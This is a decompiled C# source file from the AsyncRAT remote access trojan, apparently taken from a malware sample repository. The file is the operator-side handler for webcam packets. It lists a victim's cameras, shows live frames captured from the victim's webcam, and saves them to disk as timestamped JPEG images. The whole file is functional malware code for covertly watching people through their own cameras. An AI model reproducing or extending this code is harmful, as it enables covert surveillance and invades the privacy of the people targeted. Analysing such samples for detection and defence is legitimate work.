// Decompiled with JetBrains decompiler
// Type: Server.Handle_Packet.HandleWebcam
// Assembly: AsyncRAT, Version=0.5.7.0, Culture=neutral, PublicKeyToken=null
// MVID: 51786A10-CF9D-455B-B8A4-B82CB9EDE322
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-HackTool.MSIL.Alien.gen-bb1f2c2c9b279790b67eaea6ab0bbce3a4d4432bbe1bd716750f2f9ba3337f7e.exe

using Server.Connection;
using Server.Forms;
using Server.Helper;
using Server.MessagePack;
using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Windows.Forms;

namespace Server.Handle_Packet
{
  internal class HandleWebcam
  {
    public HandleWebcam(MsgPack unpack_msgpack, Clients client)
    {
      switch (unpack_msgpack.ForcePathObject("Command").AsString)
      {
        case "getWebcams":
          FormWebcam openForm1 = (FormWebcam) Application.OpenForms["Webcam:" + unpack_msgpack.ForcePathObject("Hwid").AsString];
          try
          {
            if (openForm1 != null)
            {
              openForm1.Client = client;
              openForm1.timer1.Start();
              string asString = unpack_msgpack.ForcePathObject("List").AsString;
              string[] separator = new string[1]{ "-=>" };
              foreach (string str in asString.Split(separator, StringSplitOptions.None))
              {
                if (!string.IsNullOrWhiteSpace(str))
                  openForm1.comboBox1.Items.Add((object) str);
              }
              openForm1.comboBox1.SelectedIndex = 0;
              if (openForm1.comboBox1.Text == "None")
              {
                client.Disconnected();
                break;
              }
              openForm1.comboBox1.Enabled = true;
              openForm1.button1.Enabled = true;
              openForm1.btnSave.Enabled = true;
              openForm1.numericUpDown1.Enabled = true;
              openForm1.labelWait.Visible = false;
              openForm1.button1.PerformClick();
              break;
            }
            client.Disconnected();
            break;
          }
          catch
          {
            break;
          }
        case "capture":
          FormWebcam openForm2 = (FormWebcam) Application.OpenForms["Webcam:" + unpack_msgpack.ForcePathObject("Hwid").AsString];
          try
          {
            if (openForm2 != null)
            {
              using (MemoryStream memoryStream = new MemoryStream(unpack_msgpack.ForcePathObject("Image").GetAsBytes()))
              {
                openForm2.GetImage = (Image) Image.FromStream((Stream) memoryStream).Clone();
                openForm2.pictureBox1.Image = openForm2.GetImage;
                ++openForm2.FPS;
                if (openForm2.sw.ElapsedMilliseconds < 1000L)
                  break;
                if (openForm2.SaveIt)
                {
                  if (!Directory.Exists(openForm2.FullPath))
                    Directory.CreateDirectory(openForm2.FullPath);
                  openForm2.pictureBox1.Image.Save(openForm2.FullPath + "\\IMG_" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".jpeg", ImageFormat.Jpeg);
                }
                openForm2.Text = "Webcam:" + unpack_msgpack.ForcePathObject("Hwid").AsString + "    FPS:" + openForm2.FPS.ToString() + "    Screen:" + openForm2.GetImage.Width.ToString() + " x " + openForm2.GetImage.Height.ToString() + "    Size:" + Methods.BytesToString(memoryStream.Length);
                openForm2.FPS = 0;
                openForm2.sw = Stopwatch.StartNew();
                break;
              }
            }
            else
            {
              client.Disconnected();
              break;
            }
          }
          catch
          {
            break;
          }
      }
    }
  }
}
